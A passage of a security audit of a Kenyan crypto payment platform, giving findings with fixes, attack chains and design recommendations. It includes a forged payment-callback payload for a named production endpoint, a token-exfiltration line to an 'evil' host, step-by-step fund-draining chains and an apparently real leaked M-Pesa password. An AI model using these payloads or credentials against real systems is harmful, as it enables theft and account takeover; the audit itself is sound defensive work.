- **Exploit:** Operator slip-up sets `DEBUG=True` in prod → withdrawal endpoints debit wallets but mock-broadcast. Users lose crypto silently.
- **Fix:** Gate on explicit `MOCK_BROADCAST=True`, never on DEBUG. Add `_assert_production_env` check that DEBUG is False.

### A29: NO ISSUE FOUND · `bcrypt.checkpw` is constant-time · PIN comparison timing-safe.

### A30: NO ISSUE FOUND · Fernet TOTP encryption uses fresh IV per encrypt · correctly implemented (downstream of A2 SECRET_KEY concern).

### A31: PIN reset is usable against suspended users — drains SMS budget
- **Severity:** Low
- **Component:** [backend/apps/accounts/views.py:2066-2116](backend/apps/accounts/views.py#L2066), [backend/apps/accounts/views.py:1894-](backend/apps/accounts/views.py#L1894)
- **Fix:** Early-return `403` for `user.is_suspended` in `ForgotPINView` + `ResetPINView`.

---

## Domain B · Payments, M-Pesa, SasaPay, Referrals, Rates (30 findings)

### B1: [CRITICAL] C2B confirmation endpoint not IP-whitelisted — unlimited free crypto minting
- **Severity:** **Critical**
- **Component:** [backend/apps/mpesa/middleware.py:49](backend/apps/mpesa/middleware.py#L49), [backend/apps/mpesa/client.py:148-149](backend/apps/mpesa/client.py#L148), [backend/apps/mpesa/views.py](backend/apps/mpesa/views.py)
- **Description:** Verified live. `MpesaIPWhitelistMiddleware.CALLBACK_PATH_PREFIX = "/api/v1/mpesa/callback/"` only. Actual C2B callback URLs registered with Safaricom are `/api/v1/hooks/c2b/confirm/` and `/api/v1/hooks/c2b/validate/` (Safaricom rejects paths containing "mpesa"). These hook paths are `AllowAny`, no IP gate, no HMAC.
- **Exploit:** POST to `https://api.cpay.co.ke/api/v1/hooks/c2b/confirm/` with JSON `{"TransID":"FAKE12345","TransAmount":"1000000","MSISDN":"254700000000","BillRefNumber":"USDT-<victim>"}`. View dedupes on TransID only; task credits crypto to victim's USDT wallet.
- **Impact:** Unlimited free crypto minted to arbitrary wallets. Drain via subsequent withdrawal.
- **Fix:** Extend `CALLBACK_PATH_PREFIX` to a tuple: `("/api/v1/mpesa/callback/", "/api/v1/hooks/c2b/")`. Add a per-TransID HMAC token generated at Validation time and required at Confirmation. Long-term: call Safaricom Transaction Status API to verify TransID existence before crediting.

### B2: [CRITICAL] SasaPay callback endpoints have no IP whitelist, no HMAC, no auth
- **Severity:** **Critical**
- **Component:** [backend/apps/mpesa/sasapay_views.py:21-92](backend/apps/mpesa/sasapay_views.py#L21), [backend/config/urls.py:45](backend/config/urls.py#L45)
- **Description:** `sasapay_callback` + `sasapay_ipn` are CSRF-exempt `require_POST` with no origin check. Registered at `/api/v1/sasapay/callback/` and `/api/v1/mpesa/sasapay/callback|ipn/`. Neither matches the whitelist prefix.
- **Exploit:** Forged JSON with `{"ResultCode":"0","MerchantTransactionReference":"<target_idempotency_key>", ...}` → pending tx flipped to COMPLETED → crypto credited. C2B IPN flow credits KES wallet by phone lookup.
- **Impact:** Same catastrophic class as B1.
- **Fix:** Add `sasapay/callback/`, `sasapay/ipn/` to IP whitelist prefix list. Implement SasaPay's documented webhook signing (if supported) OR require per-transaction HMAC tokens baked into the MerchantTransactionReference.

### B3: [CRITICAL] Referral credit double-spend via TOCTOU on `available_credit_for`
- **Severity:** **Critical**
- **Component:** [backend/apps/referrals/services.py:247-311](backend/apps/referrals/services.py#L247)
- **Description:** `available = RewardLedger.available_credit_for(user)` reads BEFORE the `atomic` block. `applied = min(available, fee_kes)` computed pre-lock. Concurrent payments each compute the same `applied`, write `-applied` CONSUMED rows, and reduce `tx.fee_amount` accordingly. Inner `select_for_update()` loop is a no-op when no AVAILABLE rows remain.
- **Exploit:** User has 50 KES credit. Fires 10 concurrent payments. All see `available=50`, all set `fee_amount -= 50`. Platform waives KES 500 of fees on 50 KES of backing.
- **Impact:** Revenue loss proportional to concurrency × per-tx credit; ledger invariant broken.
- **Fix:** Move `available_credit_for` read INSIDE the atomic block with user-level `select_for_update()` on the User row, or wrap the entire function with a Redis per-user lock.

### B4: Daily KYC limit race — concurrent payments exceed tier cap
- **Severity:** High
- **Component:** [backend/apps/payments/services.py:33-86](backend/apps/payments/services.py#L33)
- **Description:** `check_daily_limit` holds a 5s Redis lock around the read+decision but RELEASES before the Transaction is created. Concurrent callers see zero-state and both pass.
- **Exploit:** Tier 1 user (50K/day) fires two 40K `/pay-bill/` calls within microseconds → both pass → 80K total.
- **Fix:** Hold lock until after Transaction commit; OR check limit inside the same `atomic()` as the Transaction insert, with `select_for_update()` on User.

### B5: Slippage check exception handler returns `None` = "OK, proceed"
- **Severity:** High
- **Component:** [backend/apps/payments/views.py:94-114](backend/apps/payments/views.py#L94)
- **Exploit:** Rate-provider outage → slippage check raises → `except: return None` → payment proceeds at stale rate.
- **Fix:** Fail-closed on exception; reject the payment and surface a retryable error.

### B6: Referral credit consumed before saga success — not reverted on failure
- **Severity:** High
- **Component:** [backend/apps/payments/views.py:237,373,477](backend/apps/payments/views.py#L237)
- **Fix:** Apply credit AFTER `saga.execute()` success; or add compensation step that writes a positive REFUND ledger row keyed on `refund_consume:{tx.id}`.

### B7: Referrer cap race — concurrent signups bypass 20/month + 100/lifetime limits
- **Severity:** High
- **Component:** [backend/apps/referrals/services.py:59-195](backend/apps/referrals/services.py#L59)
- **Exploit:** Bot fires 200 parallel signups with one code → all pass the cap check (none are REWARDED yet) → all earn on first qualifying payment. 100-lifetime cap becomes 200+.
- **Fix:** Move cap enforcement inside `grant_referral_rewards` with `select_for_update()` on a per-referrer counter row.

### B8: Self-referral gate relies on client-supplied `device_id`
- **Severity:** High
- **Component:** [backend/apps/referrals/services.py:162-171](backend/apps/referrals/services.py#L162), [backend/apps/accounts/views.py:174-188](backend/apps/accounts/views.py#L174)
- **Description:** `device_id` is accepted raw from `request.data`. Attacker randomizes it per signup.
- **Fix:** IP+subnet check, phone-family check, Play Integrity / App Attest attestation. Require referee KYC ≥ 1 before the referrer reward mints.

### B9: `ValidateCodeView` leaks code existence and referrer first name
- **Severity:** Medium
- **Component:** [backend/apps/referrals/views.py:152-170](backend/apps/referrals/views.py#L152)
- **Fix:** Constant-time response; require session token; explicit 10/hour/IP throttle.

### B10: Public referral landing writes a ReferralEvent per request — DB bloat DoS
- **Severity:** Medium
- **Component:** [backend/apps/referrals/views.py:177-221](backend/apps/referrals/views.py#L177)
- **Fix:** Write only on cache-miss, throttle per (code, IP), add a retention job.

### B11: Balance and Timeout callbacks lack per-transaction token validation
- **Severity:** Medium
- **Component:** [backend/apps/mpesa/views.py:476-601](backend/apps/mpesa/views.py#L476)
- **Exploit:** Forged KES 50M balance → circuit breaker CLOSED → B2B flows proceed into an empty float.
- **Fix:** Invoke `_verify_token_if_present` in all callbacks; generate tokens at query-initiation time.

### B12: STK callback does not compare callback `Amount` to `tx.source_amount`
- **Severity:** Medium
- **Fix:** Reject if amounts mismatch; admin alert.

### B13: SwapView idempotency key is server-generated from `timestamp()` — double-submit not deduped
- **Severity:** Medium
- **Component:** [backend/apps/payments/views.py:778](backend/apps/payments/views.py#L778)
- **Fix:** Accept client-supplied `idempotency_key` like other payment flows; validate UUID format; DB unique constraint.

### B14: Rate-stale flag is informational, never blocks lock or payment
- **Severity:** Medium
- **Component:** [backend/apps/rates/services.py:124-128](backend/apps/rates/services.py#L124)
- **Fix:** `lock_rate()` and payment views must reject when `cache.get("rate:stale")` is set.

### B15: `expire_unused_credit` Celery task defined but not scheduled
- **Severity:** Medium
- **Component:** [backend/config/settings/base.py:183-295](backend/config/settings/base.py#L183)
- **Fix:** Add `"expire-unused-referral-credit": {"task": "apps.referrals.tasks.expire_unused_credit", "schedule": crontab(hour=3, minute=0)}`.

### B16: `check_qualification` uses `select_for_update()` outside explicit atomic — silent signal failure
- **Severity:** Medium
- **Component:** [backend/apps/referrals/services.py:211-217](backend/apps/referrals/services.py#L211)
- **Fix:** Wrap in `with db_tx.atomic():`; stop swallowing signal exceptions.

### B17: Successful payment-PIN verify resets `otp_challenge_required` → bypasses new-device challenge
- **Severity:** Medium
- **Component:** [backend/apps/payments/views.py:45-71](backend/apps/payments/views.py#L45)
- **Fix:** Only the login-success + OTP-pass path should clear `otp_challenge_required`. Payment PIN check should NOT.

### B18: JWT token in PDF-receipt URL query string logged in access logs
- **Severity:** Medium
- **Component:** [backend/apps/payments/views.py:1216-1221](backend/apps/payments/views.py#L1216) (mirror of C2)
- **Fix:** Sign a short-lived (5s) one-time URL with HMAC. Never copy `?token=` into `HTTP_AUTHORIZATION`.

### B19: SasaPay reversal raises NotImplementedError — compensation silently succeeds but doesn't undo payment
- **Severity:** Medium
- **Component:** [backend/apps/mpesa/provider.py:141-153](backend/apps/mpesa/provider.py#L141), [backend/apps/payments/saga.py:232-250](backend/apps/payments/saga.py#L232)
- **Fix:** In compensation, if `tx.mpesa_receipt` is set AND provider is SasaPay, refuse to re-credit crypto and page on-call. Don't silently compensate.

### B20: Slippage tolerance computed on `final_rate` (post-spread), not raw market
- **Severity:** Low
- **Fix:** Compare quote.raw_rate to live raw_rate; 2% on raw, not final.

### B21: `_referrer_eligible()` only checks age, not a single completed transaction
- **Severity:** Low
- **Component:** [backend/apps/referrals/services.py:78-92](backend/apps/referrals/services.py#L78)
- **Fix:** Require at least 1 COMPLETED outbound payment or KYC ≥ 1 at grant time (not signup).

### B22: `total_invites_sent` incremented non-atomically
- **Severity:** Low
- **Fix:** `F("total_invites_sent") + 1` via `.update()`. Add per-user throttle.

### B23: Late-arriving M-Pesa SUCCESS callback after compensation = crypto refunded for a paid tx
- **Severity:** Low
- **Component:** [backend/apps/payments/tasks.py:13-96](backend/apps/payments/tasks.py#L13)
- **Fix:** On late callback with `tx.status==FAILED` + `saga_data.compensated_at`, reverse the compensation (debit back) AND trigger a reversal via M-Pesa.

### B24: Admin clawback stores arbitrary-length reason verbatim
- **Severity:** Low
- **Fix:** Serializer length check (<= 500 chars).

### B25: C2B validation bypass "still processes" on out-of-range amount
- **Severity:** Medium
- **Component:** [backend/apps/mpesa/tasks.py:242-252](backend/apps/mpesa/tasks.py#L242)
- **Description:** Alerts admin but still credits. Combined with B1 → catastrophic amplifier.
- **Fix:** Reject the deposit entirely when amount outside bounds; refund path via admin.

### B26: `consume_locked_quote` user-binding skipped when either side is empty
- **Severity:** Low
- **Fix:** Require `user_id` in `lock_rate` (no empty default). Reject at consume time if missing.

### B27: Untrusted `country` / `signup_user_agent` stored on referral records
- **Severity:** Low
- **Fix:** Derive country server-side via GeoIP. Opaque UA; don't parse.

### B28: `transaction_status()` and `reversal()` use static callback URLs (no per-tx token)
- **Severity:** Medium
- **Component:** [backend/apps/mpesa/client.py:343-408](backend/apps/mpesa/client.py#L343)
- **Fix:** Use `build_callback_url("status"/"reversal", transaction_id)` with token, matching B2B/B2C.

### B29: Public landing stores IP + UA per click — KDPA compliance concern
- **Severity:** Low
- **Fix:** Hash IP with daily-rotating salt; coarse UA classification only; add privacy disclosure.

### B30: ExchangeRate does not validate rate > 0 from provider response
- **Severity:** Low
- **Component:** [backend/apps/rates/services.py:74-78](backend/apps/rates/services.py#L74)
- **Fix:** Reject `rate <= 0` or `rate > sanity_max`; fall through to fallback provider.

---

## Domain C · Mobile / Web Client (22 findings)

### C1: [CRITICAL] Access + refresh JWT stored in browser `localStorage`
- **Severity:** **Critical**
- **Component:** [mobile/src/utils/storage.ts:11,23](mobile/src/utils/storage.ts#L11), [mobile/src/stores/auth.ts:158-159](mobile/src/stores/auth.ts#L158)
- **Description:** Verified live. On web, `storage.setItemAsync("access_token", ...)` hits `localStorage.setItem`. Any XSS (supply-chain, reflected, landing-page injection) reads both tokens.
- **Exploit:** Compromised dep in the 200+ transitive tree → `fetch('https://evil/?'+localStorage.refresh_token)` → attacker calls `/auth/token/refresh/` indefinitely (30-day TTL per A1).
- **Impact:** Full web user compromise on any XSS occurrence.
- **Fix:** Move tokens to `Secure; HttpOnly; SameSite=Strict` cookies set by backend. Swap Bearer for cookie auth; add CSRF tokens on mutation. If cookies infeasible, keep access in memory only + short (2 min) lifetime.

### C2: [CRITICAL] Access token passed in URL to open PDF receipt — leaks to history, nginx access logs, Referer, CDN
- **Severity:** **Critical**
- **Component:** [mobile/app/payment/detail.tsx:994](mobile/app/payment/detail.tsx#L994), [mobile/app/payment/success.tsx:273](mobile/app/payment/success.tsx#L273), [backend/apps/payments/views.py:1216-1221](backend/apps/payments/views.py#L1216)
- **Description:** Verified live. `window.open(...?token=${access_token})`. Token appears in browser history, nginx access logs, Cloudflare logs, `document.referrer` of any outbound link inside the PDF.
- **Fix:** Backend mints short-lived (30s) HMAC-signed one-time URL via authenticated POST; client uses that. Or fetch PDF blob via axios, open `blob:` URL, revoke.

### C3: 401 interceptor force-wipes tokens on any refresh failure (rogue-CDN DoS)
- **Severity:** High
- **Component:** [mobile/src/api/client.ts:113-142](mobile/src/api/client.ts#L113)
- **Fix:** Only wipe on structured `{code: "token_not_valid"}` from `/auth/token/refresh/`.

### C4: `pending_referral_code` in localStorage auto-consumed at signup
- **Severity:** High
- **Component:** [mobile/app/r/[code].tsx:49-52](mobile/app/r/%5Bcode%5D.tsx#L49), [mobile/src/stores/auth.ts:178-243](mobile/src/stores/auth.ts#L178)
- **Fix:** Show editable field at registration; re-validate against backend at consume time; anti-fraud rules on referrer+referee.

### C5: Axios auto-retry on 5xx replays mutation endpoints — some without idempotency keys
- **Severity:** High
- **Component:** [mobile/src/api/client.ts:100-111](mobile/src/api/client.ts#L100)
- **Description:** Swap (`payments.ts:93-98`), profile-update, save-paybill, `share-event` have no `idempotency_key`. A 503 during swap → two debits.
- **Fix:** Retry only idempotent methods (GET/HEAD) OR require `idempotency_key` per-call. Add keys to all mutation APIs.

### C6: Forgot-PIN / Login client trusts backend-supplied `dev_otp` and toasts it
- **Severity:** High
- **Component:** [mobile/app/auth/forgot-pin.tsx:94-96](mobile/app/auth/forgot-pin.tsx#L94), [mobile/app/auth/login.tsx:267-271](mobile/app/auth/login.tsx#L267)
- **Description:** If a production deploy leaves `DEBUG=True` or the dev bypass on, the OTP is displayed in a toast.
- **Fix:** Strip `dev_otp` handling from client. Log a Sentry warning if backend ever includes it.

### C7: `AUTH_ENDPOINTS.some(ep => url.includes(ep))` is substring-based, fragile
- **Severity:** Medium
- **Component:** [mobile/src/api/client.ts:43,65,73](mobile/src/api/client.ts#L43)
- **Fix:** Exact-match path (strip query, compare full path).

### C8: Avatar `data:` URL accepted without MIME validation — SVG-in-img XSS in some browsers
- **Severity:** Medium
- **Component:** [mobile/src/components/UserAvatar.tsx:50-80](mobile/src/components/UserAvatar.tsx#L50)
- **Fix:** Whitelist `^data:image/(png|jpeg|gif|webp);base64,`. Reject at upload and at render.

### C9: Web-device-ID fallback uses `web-${Date.now()}` — collision defeats new-device detection
- **Severity:** Medium
- **Component:** [mobile/src/api/auth.ts:14-23](mobile/src/api/auth.ts#L14)
- **Fix:** Fail login if `crypto.randomUUID` + `crypto.getRandomValues` both unavailable.

### C10: Android APK overclaims `RECEIVE_BOOT_COMPLETED` with no corresponding code path
- **Severity:** Low
- **Component:** [mobile/app.json:82](mobile/app.json#L82)
- **Fix:** Remove permission.

### C11: `dangerouslySetInnerHTML` with string-interpolated color (today static, tomorrow injectable)
- **Severity:** Low
- **Component:** [mobile/src/components/landing/HowItWorksMockup.tsx:73-81](mobile/src/components/landing/HowItWorksMockup.tsx#L73)
- **Fix:** Replace with classNames and static CSS; or sanitize.

### C12: Clipboard copies (TOTP secret, backup codes, tx hashes) don't auto-clear
- **Severity:** Low
- **Component:** [mobile/app/settings/totp-setup.tsx:77](mobile/app/settings/totp-setup.tsx#L77), multiple
- **Fix:** 30s wipe + countdown banner; clear on AppState background.

### C13: Deep-link `cryptopay://approve-login/<id>` has no in-session origin pin
- **Severity:** Medium
- **Component:** [mobile/app/auth/approve-login/[id].tsx](mobile/app/auth/approve-login/%5Bid%5D.tsx), [mobile/app.json:110-139](mobile/app.json#L110)
- **Fix:** Require the challenge_id to be stored locally by the push-notification listener on this device within a 5-minute window. Reject external intents.

### C14: `allowBackup:false` present but auto-backup rules not pinned
- **Severity:** Low
- **Fix:** `android:fullBackupContent` via Expo config plugin to explicitly exclude auth prefs.

### C15: No HTTPS certificate pinning on axios — MITM by user-installed CA possible
- **Severity:** High
- **Component:** [mobile/src/api/client.ts:35-39](mobile/src/api/client.ts#L35)
- **Fix:** Add `react-native-ssl-pinning` or Expo config plugin. `network-security-config.xml` excludes user-added CAs. Disable cleartext.

### C16: No CSP on `index.html` — inline styles already permitted, no connect-src limits
- **Severity:** Medium
- **Fix:** Set strict CSP at CDN: `default-src 'self'; script-src 'self'; connect-src 'self' https://api.cpay.co.ke ...; frame-ancestors 'none';`. Also set Referrer-Policy, Permissions-Policy, CTO.

### C17: `outlineStyle:'none'` on every web input — accessibility + click-jacking surface
- **Severity:** Low
- **Fix:** Keep focus ring where visible cue is absent; set `X-Frame-Options: DENY` + `CSP frame-ancestors 'none'`.

### C18: `babel-plugin-transform-remove-console` only runs at `NODE_ENV=production` — EAS preview builds leak push tokens in logcat
- **Severity:** Medium
- **Component:** [mobile/babel.config.js:1-15](mobile/babel.config.js#L1)
- **Fix:** Force `NODE_ENV=production` in eas.json for both preview + production. Gate `console.log` with `if (__DEV__)`.

### C19: CORS allow-list potentially permits wildcard subdomains
- **Severity:** Medium (verify env config)
- **Fix:** Exact-match allowed origins; no wildcard. Reject `*.cpay.co.ke`.

### C20: Google Android OAuth client_id differs between app.json and source fallback — orphan-client risk
- **Severity:** Low
- **Component:** [mobile/src/hooks/useGoogleAuth.ts:11-18](mobile/src/hooks/useGoogleAuth.ts#L11), [mobile/app.json:152-153](mobile/app.json#L152)
- **Fix:** Remove hardcoded fallbacks; fail loudly on missing config. Audit Google Cloud Console; delete unused clients.

### C21: `_sessionExpired` module flag doesn't sync across tabs
- **Severity:** Low
- **Fix:** `BroadcastChannel('cpay-auth')` for cross-tab logout propagation.

### C22: `Math.random()` inside idempotency key — weak RNG
- **Severity:** Low
- **Component:** [mobile/app/payment/confirm.tsx:276](mobile/app/payment/confirm.tsx#L276), [mobile/app/payment/withdraw.tsx:184](mobile/app/payment/withdraw.tsx#L184)
- **Fix:** `crypto.randomUUID()` (already used for device ID).

---

## Domain D · Infrastructure, Docker, Dependencies (25 findings)

### D1: [CRITICAL] `Cpay-handoff-resources/` directory contains plaintext Safaricom/Google/TronGrid/Alchemy keys and was NOT gitignored
- **Severity:** **Critical**
- **Component:** `Cpay-handoff-resources/` (untracked on disk, now gitignored)
- **Description:** Verified: prior to this audit, `git check-ignore` returned no-match. Contents include `MPESA_INITIATOR_PASSWORD=Safaricom999!*!`, Google OAuth client secret `GOCSPX-…`, TronGrid key, Alchemy key, Safaricom Consumer Key/Secret.
- **Exploit:** A single `git add -A && git commit` (common in CI or during hasty local commits) publishes every secret.
- **Impact:** Multi-provider credential exposure.
- **Fix applied during this audit:** Added `Cpay-handoff-resources/`, `Cpay-handoff-resources.zip`, `cpay-brand-assets-*/`, `docs/research/`, `CryptoPay_Receipt_*.pdf`, and related patterns to [.gitignore](.gitignore). **Still required (user action):** rotate every key in the file — the archive has been on disk and may have been emailed/shared. Then delete the directory.

### D2: Default postgres password `cryptopay:cryptopay` in base compose + CI + monitoring exporter
- **Severity:** High
- **Component:** [docker-compose.yml:5-11](docker-compose.yml#L5), [docker-compose.monitoring.yml:73](docker-compose.monitoring.yml#L73), [.github/workflows/ci.yml:27](.github/workflows/ci.yml#L27)
- **Description:** `POSTGRES_PASSWORD: cryptopay` + `ports: "5432:5432"` on `0.0.0.0`. `sslmode=disable` in exporter.
- **Fix:** `${POSTGRES_PASSWORD:?}` required; bind `127.0.0.1:5432`; exporter reads env + `sslmode=require`.

### D3: `/metrics` exposed unauthenticated at root — recon surface
- **Severity:** High
- **Component:** [backend/config/urls.py:22](backend/config/urls.py#L22), [deploy/nginx/cpay.conf:105-115](deploy/nginx/cpay.conf#L105)
- **Fix:** Nginx `location /metrics { allow 10.0.0.0/8; deny all; }` or move to private Docker network.

### D4: `/media/` served via Django `serve` in production — KYC IDs enumerable
- **Severity:** High
- **Component:** [backend/config/urls.py:58-62](backend/config/urls.py#L58)
- **Fix:** Replace with authenticated `X-Accel-Redirect` view or S3 signed URLs. Strip the re_path mount.

### D5: Plaintext OTPs + user phones in `security.log` on disk
- **Severity:** High
- **Component:** [backend/apps/accounts/views.py:1349](backend/apps/accounts/views.py#L1349), `backend/logs/security.log`
- **Fix:** Never log OTPs at any level. Mask phones. Scrub + rotate existing log files. Rotate OTP-related caches.

### D6: [CRITICAL] `SECRET_KEY` is a PBKDF2 fallback for wallet seed derivation
- **Severity:** **Critical**
- **Component:** [backend/apps/blockchain/services.py:288-353](backend/apps/blockchain/services.py#L288) (fallback path verified at `:296`, "Fallback: PBKDF2 from SECRET_KEY (development only, NOT for production)")
- **Description:** If `WALLET_MNEMONIC` and `WALLET_MASTER_SEED` and KMS are all unset, derivation falls back to SECRET_KEY. Production runtime still logs the warning (per `logs/payments.log:54-60` evidence), meaning the fallback has been hit in prod at least briefly.
- **Impact:** One SECRET_KEY leak → every user's wallet drainable.
- **Fix:** Remove the fallback entirely. `_get_master_seed` must raise `ImproperlyConfigured` at boot if no seed source is configured. Extend `_assert_production_env` to gate this.

### D7: Grafana default admin password `changeme` / `cryptopay` in compose
- **Severity:** High
- **Component:** [deploy/docker-compose.prod.yml:214](deploy/docker-compose.prod.yml#L214), [docker-compose.monitoring.yml:37](docker-compose.monitoring.yml#L37)
- **Fix:** `${GRAFANA_ADMIN_PASSWORD:?}`. Upgrade Grafana 10.4.2 → 11.4.x (CVE-2024-9264).

### D8: Celery/Redis exporters in monitoring compose bypass `REDIS_PASSWORD`
- **Severity:** Medium
- **Component:** [docker-compose.monitoring.yml:84,95](docker-compose.monitoring.yml#L84)
- **Fix:** `redis://:$REDIS_PASSWORD@redis:6379`. Bind exporter ports to 127.0.0.1.

### D9: OTP code embedded in email subject line — logged in Celery task args + Sentry
- **Severity:** Medium
- **Component:** [backend/apps/core/tasks.py:79-87](backend/apps/core/tasks.py#L79), [backend/apps/core/email.py:191,222](backend/apps/core/email.py#L191)
- **Fix:** Pass token_id, not OTP, in Celery args. `sentry_sdk.init(before_send=_scrub)`.

### D10: `/admin/` exposed, no 2FA, no IP allow-list, no URL obfuscation
- **Severity:** High
- **Component:** [backend/config/urls.py:26](backend/config/urls.py#L26), [deploy/nginx/cpay.conf:105-115](deploy/nginx/cpay.conf#L105)
- **Fix:** `django_otp`/`django-two-factor-auth`, nginx allow-list, env-driven `ADMIN_URL`, per-username rate limit on login.

### D11: Base compose bind-mounts `./backend:/app` — RCE can persist changes to host
- **Severity:** Medium
- **Component:** [docker-compose.yml:34-82](docker-compose.yml#L34)
- **Fix:** Bake code into image; bind-mount `.env` read-only only. `read_only: true` on services.

### D12: `server_tokens off` missing — nginx leaks version
- **Severity:** Low
- **Fix:** Add `server_tokens off;` in `http{}`.

### D13: 10 MB `client_max_body_size` uniformly allowed on auth endpoints → DoS amplifier
- **Severity:** Medium
- **Component:** [deploy/nginx/cpay.conf:58](deploy/nginx/cpay.conf#L58)
- **Fix:** Per-location caps — 16k on auth/payment, 10M only on KYC upload.

### D14: No CSP header set anywhere
- **Severity:** Medium
- **Component:** [deploy/nginx/cpay.conf:50-55](deploy/nginx/cpay.conf#L50)
- **Fix:** Strict CSP at nginx as per C16.

### D15: JWT HS256 fallback uses `SECRET_KEY` (cross-ref A2) — monoculture key
- **Severity:** Medium
- **Component:** [backend/config/settings/base.py:342-356](backend/config/settings/base.py#L342)
- **Fix:** Remove `default=SECRET_KEY`; refuse boot without RS256 keys in prod.

### D16: Outdated/vulnerable Python deps
- **Severity:** Medium
- **Component:** [backend/requirements.txt](backend/requirements.txt)
- **Details:** `bitcoinlib==0.7.7`, `web3==7.6.0`, `tronpy==0.5.0`, `Django==5.1.4` (→ 5.1.14 for CVE-2025-26699/32873). No Dependabot/Renovate configured.
- **Fix:** `pip install -U`; re-run tests; add Dependabot.

### D17: `scripts/build-apk.sh` uses `StrictHostKeyChecking=no` for VPS SSH/SCP
- **Severity:** Medium
- **Fix:** Pre-populate `known_hosts`; use `accept-new` only first-time, then verify.

### D18: Redis DB allocation collides between cache / channels / Celery
- **Severity:** Low
- **Component:** [backend/config/settings/base.py:116,152,170](backend/config/settings/base.py#L116)
- **Fix:** Distinct DBs (cache 0, channels 2, celery 1); fail-boot on collision.

### D19: `MPESA_ALLOWED_IPS` default includes `192.168.0.0/16` + `127.0.0.0/8` — container-network bypass
- **Severity:** Medium
- **Component:** [backend/config/settings/base.py:425-431](backend/config/settings/base.py#L425)
- **Fix:** Gate private ranges behind `DEBUG`; production env must override.

### D20: `daily_database_backup` writes unencrypted pg_dump to VPS FS; no offsite; no freshness alert
- **Severity:** Medium
- **Component:** `deploy/scripts/backup-db.sh`
- **Fix:** `age -r` encryption; stream to S3/R2 with object-lock; Prometheus `mtime > 26h` alert.

### D21: Base compose binds Postgres + Redis to `0.0.0.0` — Docker bypasses `ufw`
- **Severity:** High
- **Component:** [docker-compose.yml:10-23](docker-compose.yml#L10)
- **Fix:** `127.0.0.1:5432:5432`, `127.0.0.1:6379:6379`.

### D22: Origin nginx listens HTTP-only; `SECURE_PROXY_SSL_HEADER` trusted unconditionally → CF bypass = HTTPS downgrade
- **Severity:** Medium
- **Component:** [nginx/nginx.conf:11-20](nginx/nginx.conf#L11), [deploy/nginx/cpay.conf:20](deploy/nginx/cpay.conf#L20)
- **Exploit:** Attacker hits origin IP directly, sets `X-Forwarded-Proto: https` → Django emits `Secure` cookies over HTTP → intercept.
- **Fix:** TLS at origin (LE cert) + VPS firewall to only Cloudflare origin IPs. Middleware strips `X-Forwarded-Proto` unless `REMOTE_ADDR` is in CF range.

### D23: `app.log` + `error.log` persist 50 MB of tracebacks with request bodies
- **Severity:** Low
- **Component:** `backend/logs/*.log`
- **Fix:** `SanitizingFilter` for `password|pin|otp|secret|token|mnemonic|private_key|phone`. Restrict log dir perms. Ship + drop locally.

### D24: `^` semver ranges on WalletConnect / Reown / react-native-worklets — supply-chain exposure
- **Severity:** Low
- **Component:** [mobile/package.json:12-60](mobile/package.json#L12)
- **Fix:** Pin to `~x.y.z` for high-trust deps; CI uses `npm ci` (not `npm install`).

### D25: Cloudflare token plaintext in `/opt/cryptopay/deploy/.env.cloudflare`
- **Severity:** Low
- **Fix:** Scope strictly to `Zone:Cache:Purge`. Move to Doppler/AWS Secrets Manager. `chmod 0400`.

---

## Attack Chains

### Chain 1: Anonymous attacker → free crypto → drain platform float (catastrophic, ~$K-M in hours)

1. **B1** + **B25**: POST to `/api/v1/hooks/c2b/confirm/` with forged JSON (no IP check, out-of-range amount accepted). Credit victim's USDT wallet with KES-equivalent USDT.
2. **A10** increases probability the attacker CAN force a wallet into their control via address collision if needed.
3. Withdraw the freshly-credited USDT via `/payments/withdraw/` to an external address. Repeat.
4. Optional pivot: hit `/api/v1/sasapay/callback/` (B2) if Daraja path is mitigated — same primitive.

**Blast radius:** Bounded only by hot-wallet float (~5% of total user funds per chain per the custody thresholds) and withdrawal rate limits (10/hour at user tier). With ~20 throwaway accounts, attacker can move up to `20 × 10 × withdrawal_cap` per hour.

### Chain 2: Google OAuth → takeover → drain a specific victim (~15 min)

1. **A3**: Sign in with Google using victim's known email → JWT pair issued.
2. **A18**: DELETE all trusted devices + push tokens → forces SMS-only 2FA.
3. **A26**: PATCH `/profile/` email to attacker's → verify → POST `/recovery/` swap → permanent email ownership.
4. **A19**: Brute-force PIN at 5/min (common PIN → ~20 min).
5. Withdraw via `/payments/withdraw/`.

### Chain 3: One stolen access token → 30-day session + account hijack

1. **C1** + XSS → refresh_token exfil.
2. **A1**: Rotation blacklist is a no-op → attacker refreshes indefinitely.
3. **A27**: No `/logout/` + `TokenRefreshView` doesn't re-check suspension → support cannot revoke.
4. **A18** + **A20**: Wipe devices, then `otp_already_verified=bool(otp)` bypass on new-device login from attacker's machine.

### Chain 4: Referral-program drain (~KES 100k-1M before detection)

1. **B8**: Spin up 100 signup-bots with randomized device_ids, all using attacker's referrer code.
2. **B7** race: Fire qualifying payments in parallel → all 100 earn past the 100-lifetime cap.
3. **B3**: Per bot, consume the credit 10× concurrently → each bot's 50 KES becomes 500 KES of fee waivers.
4. **B10**: Public-landing spam inflates metrics → masks the bot farm in dashboards.

### Chain 5: Rate-provider outage → stale-quote exploitation

1. **B14**: Lock many quotes at a favorable rate as `cache.get("rate:stale")` goes True.
2. **B5**: Slippage check exceptions return None → pass-through.
3. **A7**: Dust-tier fallback prices misalign confirmation tiers for incoming deposits (large value credited at 3 confs instead of 6).
4. Combined: platform loses on the crypto leg, and deposits race a re-org on the fiat leg.

### Chain 6: SECRET_KEY leak → full-platform compromise

1. Trigger information disclosure: `DEBUG=True` slip (A28 amplifier), Sentry `extra` capture, stack trace into a log aggregator (D23), or LFI into `.env`.
2. **A2** / **D15**: JWT HS256 fallback lets attacker forge any user's JWT.
3. **A2 cross-ref**: SECRET_KEY ⇒ TOTP Fernet key ⇒ decrypt all TOTP secrets.
4. **D6**: SECRET_KEY ⇒ wallet seed PBKDF2 input ⇒ derive every user's private key on every chain.
5. Total platform drain.

### Chain 7: Insider / VPS shell → DB dump + HD seed

1. **D2**/**D21**: Default postgres creds + 0.0.0.0 binding → DB reachable.
2. **D5**/**D9**: Live OTPs + PINs embedded in local logs.
3. **D25**/**D7**: Grafana default `changeme` → data source → arbitrary SQL as `cryptopay` DB user.
4. **D20**: Unencrypted pg_dump on FS → bulk exfil, including KYC docs if still on disk (D4).

---

## Secure Design Recommendations

### Architectural

1. **Cookie-based auth for web.** Move access/refresh tokens to `HttpOnly; Secure; SameSite=Strict; Domain=cpay.co.ke` cookies. Add CSRF tokens for all mutations. Keep Bearer only on native (behind SecureStore + cert pinning).
